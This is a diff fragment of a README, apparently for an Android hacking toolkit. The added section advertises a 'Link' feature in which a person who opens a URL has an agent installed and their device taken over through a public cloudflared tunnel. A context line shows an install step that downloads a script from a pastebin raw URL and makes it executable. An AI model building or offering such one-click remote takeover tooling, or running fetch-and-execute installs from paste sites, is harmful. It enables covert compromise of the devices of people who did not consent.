@@ -277,3 +277,15 @@ curl -o adbwebkit.sh https://pastebin.pl/view/raw/f57a60c7 && chmod +x adbwebkit
 ---
 
 > Always hack responsibly. 💻🔐
+
+---
+
+## Link — gain a device from a URL
+
+A tab that turns one click into control: the visitor opens a link, the console
+reaches them, installs an agent, and the existing tabs drive the device from
+then on. See [LINK.md](LINK.md).
+
+```bash
+TUNNEL=1 ./serve.sh          # public cloudflared URL + console on :8080
+```
